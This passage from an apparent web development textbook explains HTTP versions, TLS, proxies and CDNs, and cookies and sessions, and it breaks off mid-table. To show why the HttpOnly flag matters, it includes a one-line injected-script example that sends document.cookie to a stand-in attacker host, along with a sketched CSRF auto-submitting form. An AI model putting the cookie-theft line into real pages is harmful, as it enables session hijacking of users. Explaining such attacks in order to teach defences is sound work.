All three versions share the same semantics, defined once in RFC 9110: methods, status codes and headers mean the same thing everywhere. What changed is how messages are put on the wire, driven by the shift from pages with a handful of resources to applications loading hundreds of them over mobile networks.

**HTTP/1.1 (1997, revised 2022 as RFC 9112).** Text-based, one outstanding request per connection, headers repeated verbatim on every request (cookies and user agents can make each request carry 1-2 KB of redundant headers).

**HTTP/2 (2015, RFC 9113).** Grew out of Google's SPDY experiment and changed the transport encoding:

- **Binary framing.** Messages are split into frames (`HEADERS`, `DATA`, `SETTINGS`, `RST_STREAM`, ...) instead of text lines.
- **Multiplexing.** Each request-response pair is a **stream** with an ID. Frames of many streams are interleaved on one TCP connection, so a slow response no longer blocks others at the HTTP level.
- **Header compression (HPACK).** Headers are compressed with static and dynamic tables, so a repeated cookie costs a few bytes.
- **Stream prioritisation.** Clients can hint which resources matter most (the newer, simpler scheme is the `Priority` header from RFC 9218).
- **Server push** (sending resources before they are requested) was specified but proved hard to use well; Chrome removed it in 2022. `103 Early Hints` with `Link: rel=preload` is the replacement.

```text
HTTP/2: one TCP connection, interleaved frames from several streams
 ---------------------------------------------------------------------
 | H1 | H3 | D1 | D3 | D1 | H5 | D5 | D3 | D1 | D5 | ...              |
 ---------------------------------------------------------------------
 H = HEADERS frame, D = DATA frame, number = stream ID
 Stream 1 (HTML), 3 (CSS) and 5 (JS) progress in parallel.
```

**The remaining problem: TCP head-of-line blocking.** HTTP/2 multiplexes streams over a single TCP connection, and TCP guarantees in-order delivery of *bytes*. If one packet is lost, TCP holds back all data behind it, including frames of unrelated streams, until the retransmission arrives. On lossy mobile networks HTTP/2 can then perform worse than six HTTP/1.1 connections.

**HTTP/3 (2022, RFC 9114).** Runs over **QUIC** (RFC 9000), a transport protocol built on UDP:

- **Streams in the transport.** QUIC itself knows about independent streams, so a lost packet only delays the stream it belongs to.
- **Built-in TLS 1.3.** Transport and encryption handshakes are combined: a new connection needs one round trip, and a resumed one can send data immediately (**0-RTT**, which must only be used for replay-safe requests).
- **Connection migration.** Connections are identified by connection IDs, not by IP/port, so switching from Wi-Fi to mobile data does not break them.
- **QPACK** replaces HPACK, because HPACK assumes in-order delivery.

```text
            HTTP/1.1            HTTP/2               HTTP/3
          +-----------+     +-------------+     +-------------+
 HTTP     | text msgs |     | binary      |     | binary      |
          |           |     | frames,     |     | frames,     |
          |           |     | HPACK       |     | QPACK       |
          +-----------+     +-------------+     +-------------+
 Security | TLS (opt) |     | TLS (de     |     | QUIC        |  <- streams, reliability,
          +-----------+     | facto req.) |     | (with TLS   |     congestion control and
 Transport|    TCP    |     +-------------+     |  1.3 inside)|     TLS 1.3 combined
          |           |     |     TCP     |     +-------------+
          |           |     |             |     |     UDP     |
          +-----------+     +-------------+     +-------------+
```

| Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---|---|---|---|
| Encoding | Text | Binary frames | Binary frames |
| Transport | TCP | TCP | QUIC over UDP |
| Concurrent requests per connection | 1 (pipelining unused) | Many (multiplexed) | Many (independent streams) |
| Head-of-line blocking | HTTP and TCP level | TCP level only | Eliminated across streams |
| Header compression | None | HPACK | QPACK |
| Encryption | Optional | Required by browsers | Always (TLS 1.3 built in) |
| Connection setup (new) | TCP + TLS: 2-3 RTT | TCP + TLS: 2-3 RTT | 1 RTT (0-RTT on resumption) |

**How clients discover the version.** HTTP/2 over TLS is negotiated during the TLS handshake via **ALPN** (Application-Layer Protocol Negotiation): the client offers `h2, http/1.1` and the server picks one. HTTP/3 cannot be negotiated that way, because it uses a different transport; the server advertises it with an `Alt-Svc: h3=":443"` header or an `HTTPS` DNS record, and the browser switches on later connections.

```bash
curl -sI --http1.1 https://cloudflare.com | head -1   # HTTP/1.1 200 OK (or a redirect)
curl -sI --http2   https://cloudflare.com | head -1   # HTTP/2 200
curl -sI --http3   https://cloudflare.com | head -1   # HTTP/3 200 (needs a curl built with HTTP/3)
curl -sI https://cloudflare.com | grep -i alt-svc      # alt-svc: h3=":443"; ma=86400
```

For application developers the version is mostly transparent: `fetch`, Express handlers and `Cache-Control` behave the same. What changes is performance tuning (stop sharding, keep connections warm) and infrastructure: HTTP/2 and HTTP/3 are usually terminated by a CDN or reverse proxy that talks to your Node.js server over plain HTTP/1.1.

**Key Takeaways**

- All versions share the same semantics; they differ in wire format and transport.
- HTTP/2 adds binary framing, multiplexed streams and HPACK over a single TCP connection.
- TCP's in-order delivery still causes head-of-line blocking in HTTP/2 when packets are lost.
- HTTP/3 runs over QUIC (UDP), with per-stream delivery, built-in TLS 1.3, faster handshakes and connection migration.
- HTTP/2 is negotiated with ALPN; HTTP/3 is discovered via `Alt-Svc` or HTTPS DNS records.

> **Practice**
>
> 1. *(Beginner)* In the DevTools Network panel, right-click the column headers, enable the "Protocol" column, and load three large sites. Which use `h2` and which `h3`?
> 2. *(Intermediate)* Explain, with a diagram, what happens to three parallel downloads when a single packet carrying data for one of them is lost, under HTTP/2 and under HTTP/3.
> 3. *(Interview)* "If HTTP/3 is better, why does every server still support HTTP/1.1 and HTTP/2?" *Hint:* think about UDP being blocked by corporate firewalls, discovery via `Alt-Svc`, tooling, and server-to-server traffic behind a proxy.

#### HTTPS, TLS and Certificates

Plain HTTP travels in clear text: anyone on the path (the café Wi-Fi, an ISP, a compromised router) can read passwords and cookies or modify pages in transit. **HTTPS** is HTTP sent inside a **TLS** (Transport Layer Security) connection, which provides three guarantees:

| Guarantee | Protects against | Mechanism |
|---|---|---|
| **Confidentiality** | Eavesdropping | Symmetric encryption (AES-GCM, ChaCha20-Poly1305) with session keys |
| **Integrity** | Tampering (injected ads, malware) | Authenticated encryption detects any modification |
| **Authentication** | Impersonation ("am I really talking to my bank?") | Server certificate signed by a trusted Certificate Authority |

**The TLS 1.3 handshake.** Encryption with a shared secret is fast, but the two sides have never met. The handshake uses asymmetric cryptography to agree on a secret over an open network and to prove the server's identity:

```text
Client                                                Server
  | ClientHello                                          |
  |  - supported cipher suites, TLS versions             |
  |  - key share (ephemeral Diffie-Hellman public key)   |
  |  - SNI: "shop.example.com"   ALPN: h2, http/1.1      |
  |----------------------------------------------------->|
  |                                         ServerHello  |
  |                - chosen cipher suite, server key share|
  |   {Certificate}  {CertificateVerify}  {Finished}     |  { } = already encrypted
  |<-----------------------------------------------------|
  | Both sides now compute the same session keys from    |
  | the two key shares (ECDHE). The client verifies the  |
  | certificate chain and the CertificateVerify signature.|
  | {Finished}  {GET / HTTP/1.1 ...}                      |
  |----------------------------------------------------->|
  One round trip before application data (TLS 1.2 needed two).
```

The ephemeral Diffie-Hellman exchange gives **forward secrecy**: even if the server's private key is stolen later, recorded past sessions cannot be decrypted.

**Certificates and the chain of trust.** A certificate (X.509 format) binds a public key to a domain name and is signed by a **Certificate Authority (CA)**. Browsers and operating systems ship with a list of trusted root CAs. Servers send their own certificate plus intermediate certificates, and the client builds a chain up to a trusted root:

```text
  Root CA (self-signed, preinstalled in the OS/browser trust store)
     |  signs
  Intermediate CA (e.g. Let's Encrypt R11)
     |  signs
  Leaf certificate: CN/SAN = shop.example.com, www.shop.example.com
                    public key, validity period, signature

  Client checks: signatures valid up the chain, domain matches SAN,
                 not expired, not revoked, key usage correct
```

**Getting certificates.** Let's Encrypt and other ACME-based CAs issue free, automatically renewed domain-validated certificates; tools such as Certbot, Caddy and most hosting platforms handle it transparently. Certificate lifetimes are deliberately getting shorter (the industry-wide maximum dropped to 200 days in March 2026 and is scheduled to reach 47 days by 2029), so renewal must be automated.

| Certificate type | Validation | Typical use |
|---|---|---|
| Domain Validated (DV) | Control of the domain (HTTP or DNS challenge) | The vast majority of sites |
| Organization/Extended Validation (OV/EV) | Legal identity checks | Some corporate sites (browsers no longer show special UI) |
| Wildcard (`*.example.com`) | DNS challenge | Many subdomains |
| Self-signed | None | Local development only |

**Inspecting a TLS connection.**

```bash
# Show the negotiated protocol, cipher and certificate chain
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \
  | grep -E 'Protocol|Cipher|subject=|issuer='

# Show certificate validity dates
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \
  | openssl x509 -noout -dates -ext subjectAltName
```

**SNI.** Because one IP address hosts many HTTPS sites, the client sends the hostname in the ClientHello (**Server Name Indication**) so the server can pick the right certificate. SNI is visible to observers; Encrypted Client Hello (ECH) hides it and is being rolled out by browsers and CDNs.

**Enforcing HTTPS.** Redirecting `http://` to `https://` still leaves the first request exposed. **HSTS** (HTTP Strict Transport Security) tells the browser to use HTTPS only for a period, and the preload list hardcodes this into browsers:

```http
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

**Mixed content.** An HTTPS page that loads scripts over HTTP undermines its own security; browsers block such "active" mixed content and upgrade or block images.

**Local development.** Many browser features (Service Workers, geolocation, `crypto.subtle`, Secure cookies) require a **secure context**. `http://localhost` counts as secure; for other hostnames tools like `mkcert` create a local CA trusted by your machine. Node.js HTTPS servers are covered in Chapter 11.6.

**Key Takeaways**

- HTTPS = HTTP over TLS, giving confidentiality, integrity and server authentication.
- TLS 1.3 completes its handshake in one round trip and uses ephemeral key exchange for forward secrecy.
- Certificates bind a public key to domain names; trust flows from root CAs through intermediates to the leaf.
- ACME/Let's Encrypt make certificates free and automatic; shortening lifetimes make automation mandatory.
- Use HSTS to prevent downgrade to HTTP; avoid mixed content; many APIs require a secure context.

> **Practice**
>
> 1. *(Beginner)* Click the padlock in your browser on three sites and note the issuer, validity period and Subject Alternative Names of each certificate.
> 2. *(Intermediate)* Use `mkcert` to create a certificate for `myapp.test`, start a Node.js HTTPS server with it, and confirm the browser trusts it. Then try the same with a self-signed certificate and compare the browser's behaviour.
> 3. *(Interview)* "A user on public Wi-Fi types `bank.com` in the address bar. Walk through the attack possibilities before and after the bank deploys HSTS with preload." *Hint:* the first plain-HTTP request and SSL stripping.

#### Proxies, Gateways and CDNs

Between a browser and the server that finally answers a request there are often several **intermediaries**. HTTP was designed for this layered architecture: because messages are self-descriptive (method, headers, cache rules), intermediaries can forward, cache, transform or inspect them without understanding the application.

**Kinds of intermediaries.**

```text
                 forward proxy                     reverse proxy / gateway
 [Browser] ----> [ Corporate  ] ---- Internet ---> [ nginx / load  ] --> [ Node.js app 1 ]
 [Browser] ----> [  proxy     ]                    [ balancer / API] --> [ Node.js app 2 ]
                 acts for the CLIENTS              [ gateway       ] --> [ auth service  ]
                 (filtering, caching,              acts for the SERVERS
                  egress control)                  (TLS, routing, caching, rate limits)
```

| Intermediary | Acts on behalf of | Typical jobs |
|---|---|---|
| **Forward proxy** | Clients | Filtering, logging, shared caching, anonymity, egress control in companies |
| **Reverse proxy** | Servers | TLS termination, load balancing, compression, static files, caching, request buffering |
| **Gateway / API gateway** | Servers | Protocol translation, authentication, rate limiting, routing to microservices |
| **Tunnel** | Either | Relays raw bytes without inspecting them (`CONNECT` for HTTPS through a proxy) |
| **CDN** | Servers (distributed reverse proxy) | Serves cached content from edge locations close to users |

**Forward proxies and HTTPS.** A forward proxy cannot read HTTPS traffic. The client asks it to open a tunnel, then speaks TLS end to end with the server:

```http
CONNECT shop.example.com:443 HTTP/1.1
Host: shop.example.com:443

HTTP/1.1 200 Connection Established

<TLS handshake and encrypted HTTP flow through the tunnel>
```

(Some corporate proxies deliberately intercept TLS by installing their own root CA on company machines.)

**Reverse proxies in front of Node.js.** A typical production setup puts nginx, Caddy, HAProxy or a cloud load balancer in front of the application:

```nginx
# nginx: TLS termination, compression and proxying to a Node.js app
server {
    listen 443 ssl;
    http2 on;
    server_name shop.example.com;
    ssl_certificate     /etc/letsencrypt/live/shop.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/shop.example.com/privkey.pem;

    gzip on;
    gzip_types application/json text/css application/javascript;

    location /static/ {
        root /var/www/shop;                          # serve files directly, no Node involved
        expires 1y;
    }

    location / {
        proxy_pass http://127.0.0.1:3000;            # forward to Node.js over plain HTTP
        proxy_set_header Host              $host;
        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;  # tells the app the client used https
    }
}
```

**Who is the real client?** Behind a proxy, the TCP peer address seen by the application is the proxy's, not the user's. Proxies add headers describing the original request:

| Header | Content |
|---|---|
| `X-Forwarded-For` | Comma-separated chain of client and proxy IPs (de facto standard) |
| `X-Forwarded-Proto` / `X-Forwarded-Host` | Original scheme and host |
| `Forwarded` | Standardised equivalent (RFC 7239): `for=203.0.113.7;proto=https;host=shop.example.com` |
| `Via` | Protocol versions and names of the intermediaries traversed |

These headers can be forged by clients, so an application must only trust them when they were set by *its own* proxies. Express exposes this as a setting:

```javascript
// Express: trust exactly one proxy hop (our nginx); req.ip and req.protocol then use X-Forwarded-*
app.set('trust proxy', 1);
app.get('/whoami', (req, res) => res.json({ ip: req.ip, secure: req.secure })); // secure: true if https at the proxy
```

**CDNs.** A Content Delivery Network (Cloudflare, Akamai, Fastly, CloudFront) is a global fleet of reverse proxies. DNS or anycast routing sends each user to a nearby **edge** location; on a cache hit the response never reaches the origin.

```text
 User in Milan -> CDN edge Milan  --(cache hit)--> response in 10 ms
 User in Tokyo -> CDN edge Tokyo  --(cache miss)-> origin in Frankfurt -> cached at Tokyo edge
```

CDNs honour `Cache-Control`, `s-maxage` and `Vary`, and often add their own controls (`CDN-Cache-Control`, purge APIs, cache tags). Many also run code at the edge (Cloudflare Workers, Fastly Compute, Vercel/Netlify edge functions) for redirects, A/B tests or authentication close to the user, and provide DDoS protection and a web application firewall.

**Key Takeaways**

- Forward proxies act for clients; reverse proxies, gateways and CDNs act for servers.
- HTTPS passes through forward proxies via `CONNECT` tunnels.
- Reverse proxies typically handle TLS, compression, static files and load balancing in front of Node.js.
- `X-Forwarded-*` and `Forwarded` carry the original client information; trust them only from known proxies.
- CDNs cache responses at edge locations according to HTTP caching headers, cutting latency and origin load.

> **Practice**
>
> 1. *(Beginner)* Run `curl -sI https://www.cloudflare.com` and `curl -sI https://www.fastly.com`, and find headers that reveal a CDN cache and whether the response was a hit (`cf-cache-status`, `x-cache`, `age`).
> 2. *(Intermediate)* Put nginx (or Caddy) in front of a small Node.js server on port 3000 and make the app log the real client IP and scheme. Then send a request with a forged `X-Forwarded-For` header and confirm your configuration does not trust it blindly.
> 3. *(Interview)* "Your API applies rate limits per client IP, but after moving behind a load balancer every client is limited together. What happened and how do you fix it safely?" *Hint:* the TCP peer is now the load balancer; consider forwarded headers and how many proxy hops you trust.

<a id="102-cookies-and-sessions"></a>
### 10.2 Cookies and Sessions

This subchapter shows how applications build memory on top of stateless HTTP: cookies and their attributes, server-side sessions and their storage, the attacks that target session identifiers, and how cookies compare with tokens and browser storage.

#### State Management over a Stateless Protocol

Shopping carts, logins, language preferences and multi-step forms all need the server to recognise that several requests belong together. Since HTTP does not remember anything between requests (10.1), the application has to add an identifier to every request and use it to look up or reconstruct state.

Think of a cloakroom: you hand over your coat and receive a numbered ticket. The cloakroom does not remember your face; on your way out you show the ticket and get the coat back. The ticket is meaningless to anyone but the cloakroom, but anyone holding it can claim the coat. That is a session cookie, and also its main security weakness.

**Where state can live.**

| Technique | How the client re-identifies itself | Where the state is stored | Notes |
|---|---|---|---|
| URL parameters | `/cart?sid=abc123` or `/cart;jsessionid=abc123` | Server | Leaks via logs, `Referer`, shared links; obsolete |
| Hidden form fields | `<input type="hidden" name="step" value="2">` | Client (in the page) | Only for form flows; must be validated, user can edit it |
| **Cookies** | Browser sends `Cookie` header automatically | Client (small values) or server (ID only) | The standard browser mechanism |
| **Tokens** in `Authorization` | Client code adds `Authorization: Bearer ...` | Client (self-contained token) or server | Common for APIs and mobile apps (10.3) |
| Web Storage / IndexedDB | Client code reads it and sends it explicitly | Client | Not sent automatically (6.4, 10.2 last topic) |

**Two strategies.**

```text
Server-side state (sessions)                    Client-side state (self-contained)
------------------------------                  ----------------------------------
Cookie: sid=9f8e7d                              Cookie: cart=eyJpdGVtcyI6WzQyXX0.sig
         |                                               |
         v                                               v
 +------------------------+                      server verifies signature,
 | session store          |                      reads data from the value itself
 | 9f8e7d -> { user: 7,   |                      (no lookup, but the client holds the data,
 |   cart: [42], lang: it}|                       size is limited and revocation is hard)
 +------------------------+
```

- **Server-side state** sends only a random identifier; the data stays on the server. It is easy to change or revoke, but every request needs a lookup in a store that all servers share.
- **Client-side state** puts the data itself in the cookie or token, protected by a signature (and optionally encryption) so the client cannot tamper with it. No lookup is needed, but the data travels with every request and cannot easily be revoked before it expires.

Most real systems combine them: a session ID or token for identity, server-side data for everything large or sensitive.

**Key Takeaways**

- Because HTTP is stateless, applications reattach an identifier to every request to recognise returning clients.
- Cookies are the browser's built-in mechanism; tokens in `Authorization` are common for APIs and mobile apps.
- State can be stored server-side (session ID only on the client) or client-side (signed data on the client).
- Whoever holds the identifier is treated as the user, so it must be protected like a password.

> **Practice**
>
> 1. *(Beginner)* List three features of a typical e-commerce site that require state across requests and say which technique from the table you would use for each.
> 2. *(Intermediate)* Explain why putting a session ID in the URL (`?sid=...`) is dangerous, naming at least three ways it could leak.
> 3. *(Interview)* "Compare storing a shopping cart in a signed cookie versus in a server-side session." *Hint:* consider size limits, server load, multiple devices, tampering and what happens when the price of an item changes.

#### Set-Cookie and Cookie Headers

A **cookie** is a small named value that a server asks the browser to store and send back on later requests to the same site. Cookies were introduced by Netscape in 1994 (for a shopping cart) and are now specified by RFC 6265, currently being revised as "RFC 6265bis".

**The two headers.** The server sets cookies with one `Set-Cookie` header per cookie; the browser returns all matching cookies in a single `Cookie` header:

```text
Browser                                              Server
  | POST /login  (username, password)                  |
  |--------------------------------------------------->|
  | 200 OK                                             |
  | Set-Cookie: sid=9f8e7d; Path=/; HttpOnly; Secure   |
  | Set-Cookie: lang=it; Max-Age=31536000; Path=/      |
  |<---------------------------------------------------|
  |                                                    |
  | GET /account                                       |
  | Cookie: sid=9f8e7d; lang=it                        |   <- sent automatically by the browser
  |--------------------------------------------------->|
```

Note the asymmetry: `Set-Cookie` carries attributes (`Path`, `HttpOnly`, ...) that tell the browser *how* to store and when to send the cookie, but the `Cookie` header sends back only `name=value` pairs. The server never learns the attributes or the expiry date from the browser.

**Lifecycle.**

| Action | How |
|---|---|
| Create | `Set-Cookie: name=value; ...attributes` |
| Update | Send `Set-Cookie` with the same name, `Domain` and `Path` and a new value |
| Delete | Send `Set-Cookie` with the same name, `Domain` and `Path` and `Max-Age=0` (or a past `Expires`) |
| Session cookie | No `Expires`/`Max-Age`: deleted when the browser session ends (browsers that restore sessions may keep it) |

**Value encoding.** Cookie values cannot contain spaces, commas, semicolons or most control characters. Applications usually URL-encode or base64url-encode values:

```javascript
// Node.js http: set, read and delete cookies without a library
import { createServer } from 'node:http';

function parseCookies(header = '') {
  return Object.fromEntries(
    header.split(';').filter(Boolean).map((pair) => {
      const [name, ...rest] = pair.trim().split('=');
      return [name, decodeURIComponent(rest.join('='))];  // values may contain "="
    })
  );
}

createServer((req, res) => {
  const cookies = parseCookies(req.headers.cookie);
  if (req.url === '/set') {
    res.setHeader('Set-Cookie', [                          // array -> several Set-Cookie headers
      `theme=${encodeURIComponent('dark mode')}; Path=/; Max-Age=86400; SameSite=Lax`,
      'visited=1; Path=/; SameSite=Lax',
    ]);
  } else if (req.url === '/clear') {
    res.setHeader('Set-Cookie', 'theme=; Path=/; Max-Age=0'); // same name and Path, expired
  }
  res.end(`Cookies received: ${JSON.stringify(cookies)}\n`);
}).listen(3000);
```

In Express the `cookie-parser` middleware and `res.cookie()` do the same (Chapter 12).

**Cookies in the browser.** JavaScript can read and write non-`HttpOnly` cookies through `document.cookie`, an awkward string-based API: reading returns all visible cookies as one string, and assigning adds or updates a *single* cookie.

```javascript
document.cookie = 'theme=dark; Path=/; Max-Age=86400; SameSite=Lax'; // sets ONE cookie
document.cookie = 'fontSize=16; Path=/';                              // adds another, keeps theme
console.log(document.cookie);              // "theme=dark; fontSize=16" (attributes never shown)
document.cookie = 'theme=; Path=/; Max-Age=0';                        // delete theme
```

The asynchronous **Cookie Store API** (`await cookieStore.get('theme')`, `cookieStore.set(...)`, change events) is available in newer browsers and is easier to use where supported.

**Size limits.** Browsers guarantee at least 4096 bytes per cookie (name, value and attributes together) and at least 50 cookies per domain. Every matching cookie is sent with *every* request, including image and script requests, so large cookies slow down the whole site. Keep cookies small and serve static assets from a cookieless domain or CDN if necessary.

**Key Takeaways**

- Servers set cookies with `Set-Cookie` (one header per cookie, with attributes); browsers return them in one `Cookie` header with only names and values.
- Update a cookie by resending it with the same name, `Domain` and `Path`; delete it with `Max-Age=0`.
- Without `Expires`/`Max-Age`, a cookie is a session cookie.
- `document.cookie` can access cookies that are not `HttpOnly`; it sets one cookie per assignment.
- Cookies are limited to about 4 KB each and travel with every matching request, so keep them small.

> **Practice**
>
> 1. *(Beginner)* Run the Node.js example, visit `/set`, then `/` and `/clear`, and observe the cookies in the DevTools Application panel after each step.
> 2. *(Intermediate)* Write a small server that counts how many times each browser has visited, storing the counter in a cookie. Then explain how a user could cheat the counter and how you could prevent it with an HMAC signature.
> 3. *(Interview)* "A user reports they cannot log out: the session cookie survives the logout request. What are the most likely causes?" *Hint:* a deletion only matches a cookie with the same name, `Domain` and `Path`.

#### Cookie Attributes: Expires, Path and Domain

Attributes in `Set-Cookie` control a cookie's **lifetime** and **scope**: how long the browser keeps it, and to which requests it is attached. Getting the scope wrong leaks cookies to places they should not go or makes them disappear where they are needed.

**Lifetime: `Expires` and `Max-Age`.**

```http
Set-Cookie: remember=1; Expires=Sun, 03 Oct 2027 09:00:00 GMT   <- absolute date (HTTP date format)
Set-Cookie: remember=1; Max-Age=31536000                         <- relative: seconds from now
```

| Attribute | Value | Notes |
|---|---|---|
| `Expires` | HTTP date in GMT | Depends on the client's clock |
| `Max-Age` | Seconds | Takes precedence if both are present; `0` or negative deletes |
| Neither | | Session cookie: removed when the browser session ends |

Browsers cap very long lifetimes: Chromium limits cookie expiry to 400 days (as proposed in RFC 6265bis), and Safari can shorten cookies set by scripts. Long-lived "remember me" cookies should therefore be refreshed on use.

**Path.** A cookie is sent only for request paths that match its `Path` prefix (on segment boundaries):

```text
Set-Cookie: cart=42; Path=/shop

  /shop            -> sent
  /shop/checkout   -> sent
  /shopping        -> NOT sent  (not a path-segment match)
  /                -> NOT sent
```

If `Path` is omitted, the default is the "directory" of the request URL that set it (for `/shop/login`, the default is `/shop`). This surprises many developers, so it is good practice to always set `Path=/` explicitly unless you need a narrower scope. **`Path` is not a security boundary**: a page under `/` can still read `/admin` cookies by opening `/admin` in an iframe, because both have the same origin.

**Domain.** Controls which hosts receive the cookie:

```text
Response from shop.example.com:

Set-Cookie: a=1                         -> host-only: sent ONLY to shop.example.com
Set-Cookie: b=2; Domain=example.com     -> sent to example.com AND every subdomain:
                                           shop.example.com, api.example.com, evil.example.com...
Set-Cookie: c=3; Domain=other.com       -> rejected: a site cannot set cookies for another domain
Set-Cookie: d=4; Domain=com             -> rejected: "com" is a public suffix
```

Counter-intuitively, *omitting* `Domain` is the most restrictive option (host-only). Setting `Domain` widens the scope to all subdomains. Browsers consult the **Public Suffix List** so that nobody can set a cookie for `co.uk` or `github.io` as a whole.

**Choosing the scope.**

| Scenario | Recommended attributes |
|---|---|
| Session cookie for one app | No `Domain` (host-only), `Path=/` |
| Single sign-on across `app.example.com` and `admin.example.com` | `Domain=example.com` (only if every subdomain is trusted) |
| Preference used by one section | `Path=/section` (convenience, not security) |
| Maximum lockdown | `__Host-` prefix (see next topic): forces `Secure`, `Path=/` and no `Domain` |

**Cookies are not isolated by port or (for reading) by scheme.** `example.com:3000` and `example.com:4000` share cookies, which matters when running several local apps on `localhost`.

```javascript
// Express (Chapter 12): res.cookie maps options to attributes
res.cookie('remember', token, {
  maxAge: 30 * 24 * 60 * 60 * 1000,  // Express takes milliseconds and writes Max-Age in seconds
  path: '/',
  // domain omitted -> host-only cookie
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
});
```

**Key Takeaways**

- `Max-Age` (seconds) beats `Expires` (date); without either the cookie lasts for the browser session.
- `Path` restricts which URL paths receive the cookie; it defaults to the directory of the setting URL, so set `Path=/` explicitly. It is not a security boundary.
- Omitting `Domain` makes a host-only cookie; setting `Domain` shares it with all subdomains.
- Browsers reject cookies for unrelated domains and public suffixes.
- Cookies are shared across ports of the same host.

> **Practice**
>
> 1. *(Beginner)* For a cookie set by `https://app.example.com/account/login` with no `Path` or `Domain`, list which of these requests receive it: `/account`, `/account/settings`, `/`, `https://api.example.com/account`.
> 2. *(Intermediate)* Set two cookies with the same name but different `Path` values and observe the order in which the browser sends them in the `Cookie` header. How should a server handle duplicate names?
> 3. *(Interview)* "Your company hosts user-generated sites on `*.pages.example.com` and the main app on `app.example.com`. The session cookie uses `Domain=example.com`. What is the risk?" *Hint:* any subdomain receives, and can also set, cookies for the parent domain.

#### Secure, HttpOnly and SameSite Flags

Lifetime and scope decide *where* a cookie goes; three security flags decide *under what conditions* and *to whom* it is exposed. For any cookie that identifies a user, all three should be set deliberately.

**`Secure`: only over HTTPS.** The browser sends the cookie only on HTTPS requests (and `localhost`), and refuses `Secure` cookies set by plain-HTTP pages. Without it, a single `http://` request (a typed URL, an old link) sends the session ID in clear text to anyone on the network.

**`HttpOnly`: invisible to JavaScript.** The cookie is sent with requests but cannot be read through `document.cookie`. If an attacker injects a script into your page (XSS, Chapter 17), they cannot steal an `HttpOnly` session cookie and use it from their own machine. They can still make requests *from the victim's browser*, so `HttpOnly` limits the damage of XSS rather than preventing it.

```javascript
// Attacker's injected script on a vulnerable page
fetch('https://evil.example/steal?c=' + encodeURIComponent(document.cookie));
// With HttpOnly on the session cookie, document.cookie does not contain it.
```

**`SameSite`: cross-site sending policy.** By default cookies are attached to every request to their domain, including requests triggered by *other* sites: an image, a form submission or a link on `evil.example` pointing at `bank.example`. That is the root of **Cross-Site Request Forgery** (CSRF, Chapter 17). `SameSite` restricts it:

| Value | Sent on same-site requests | Sent on cross-site top-level navigation (clicking a link) | Sent on cross-site subrequests (img, iframe, fetch, form POST) |
|---|---|---|---|
| `Strict` | Yes | **No** | No |
| `Lax` | Yes | Yes, for safe methods (GET) | No |
| `None` | Yes | Yes | Yes (requires `Secure`) |

```text
User is logged in to bank.example (session cookie) and visits evil.example, which contains:

<form action="https://bank.example/transfer" method="POST"> ... auto-submitted ... </form>

  SameSite=None   -> cookie sent -> transfer executes as the user       (CSRF succeeds)
  SameSite=Lax    -> cross-site POST, cookie NOT sent -> request is anonymous (blocked)
  SameSite=Strict -> cookie NOT sent; also not sent when the user simply follows a link
                     from an email to bank.example, so they appear logged out on arrival
```

"Same-site" means same **registrable domain** (scheme plus eTLD+1): `app.example.com` and `api.example.com` are same-site, but cross-origin. Chromium-based browsers treat cookies without a `SameSite` attribute as `Lax`; other browsers have different defaults, so always set it explicitly. `SameSite=Lax` is the sensible default for session cookies; use `Strict` for highly sensitive cookies where the "logged out after following a link" effect is acceptable, and `None; Secure` only when you really need cross-site use (embedded widgets, third-party integrations).

**Cookie prefixes.** Names starting with special prefixes make the browser enforce attributes, protecting against cookies injected by subdomains or insecure pages:

| Prefix | Browser requires |
|---|---|
| `__Secure-` | `Secure`, set from an HTTPS page |
| `__Host-` | `Secure`, HTTPS, `Path=/` and **no** `Domain` (host-only, cannot be set by a subdomain) |

**Partitioned cookies (CHIPS).** Browsers increasingly block or restrict third-party cookies (Safari and Firefox do so by default). Embedded services that need state per embedding site can use `Partitioned`, which stores a separate cookie jar for each top-level site:

```http
Set-Cookie: __Host-widget=abc; Secure; Path=/; SameSite=None; Partitioned
```

**A recommended session cookie.**

```http
Set-Cookie: __Host-sid=k3J9aQ...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=7200
```

**Key Takeaways**

- `Secure` restricts a cookie to HTTPS; `HttpOnly` hides it from JavaScript; `SameSite` controls cross-site sending.
- `HttpOnly` reduces the impact of XSS but does not prevent requests made from the victim's page.
- `SameSite=Lax` blocks most CSRF while keeping normal link navigation working; `None` requires `Secure`.
- The `__Host-` prefix guarantees a host-only, secure, `Path=/` cookie.
- Set all flags explicitly; browser defaults differ.

> **Practice**
>
> 1. *(Beginner)* Write `Set-Cookie` headers for: a session cookie, a non-sensitive UI theme preference readable by JavaScript, and a cookie for a chat widget embedded on many third-party sites.
> 2. *(Intermediate)* Build two local sites (for example `site-a.test` and `site-b.test` via `/etc/hosts`). Set a cookie on site A with each `SameSite` value and test which are sent when site B links to, embeds an image from, and auto-submits a form to site A.
> 3. *(Interview)* "If all session cookies are `SameSite=Lax`, do we still need CSRF tokens?" *Hint:* consider state-changing GET endpoints, same-site but different-origin subdomains, older browsers and defence in depth.

#### The Session Concept and Session Identifiers

A **session** is the server's memory of a series of interactions with one client: who is logged in, what is in the cart, which step of a wizard they reached. The client holds only a **session identifier** (session ID), usually in a cookie; the server keeps the data.

**The session lifecycle.**

```text
1. First request, no cookie
   Browser --- GET /  ------------------------------------------> Server
                                         creates session s=Q2x9... -> store: { }
   Browser <-- Set-Cookie: sid=Q2x9...; HttpOnly; Secure; SameSite=Lax

2. Login
   Browser --- POST /login  Cookie: sid=Q2x9... -----------------> verifies password
                                         REGENERATES the ID (see fixation, later)
                                         store: { userId: 7, roles: ["user"] } under sid=Zp4L...
   Browser <-- Set-Cookie: sid=Zp4L...

3. Later requests
   Browser --- GET /orders  Cookie: sid=Zp4L... -----------------> store lookup -> userId 7

4. Logout or expiry
   Browser --- POST /logout  Cookie: sid=Zp4L... ----------------> store: delete Zp4L...
   Browser <-- Set-Cookie: sid=; Max-Age=0
```

**What makes a good session ID.** The ID is effectively a temporary password: anyone who presents it is treated as the user. It must therefore be:

| Property | Why | How |
|---|---|---|
| Unpredictable | Attackers must not guess valid IDs | Generated by a cryptographically secure random number generator |
